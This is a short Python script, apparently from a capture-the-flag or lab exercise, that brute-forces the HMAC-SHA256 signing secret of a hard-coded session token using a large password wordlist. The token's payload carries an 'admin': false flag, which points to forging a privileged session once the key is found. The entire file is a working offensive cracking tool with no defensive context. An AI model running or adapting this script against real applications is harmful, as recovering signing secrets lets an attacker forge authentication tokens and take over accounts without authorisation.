#!/usr/bin/env python

import jwt
import base64
import hmac
import hashlib
import sys


class colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'


token = "eyJhZG1pbiI6ZmFsc2UsInNlY3JldF9rZXkiOiIkaGFsbElDb21wYXJlVEhFRTJhU3VtbWVyc2RheSJ9.Z8zG_w.N9vUw_7yyuGVXOKDQ6QcB5q5VEQ"
wordlist = "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt"

header_enc, payload_enc, sig_enc = token.split('.')
sig_b = base64.urlsafe_b64decode(sig_enc + "==")
data = f"{header_enc}.{payload_enc}".encode()

with open(wordlist, "rb") as f:
    for line in f:
        secret = line.strip()
        test_sig = hmac.new(secret, data, hashlib.sha256).digest()

        if hmac.compare_digest(test_sig, sig_b):
            print(
                f"{colors.GREEN}[+] Secret found: {colors.RESET}{secret.decode()}")
            sys.exit(0)

print(f"{colors.RED}[!] Secret not found.")
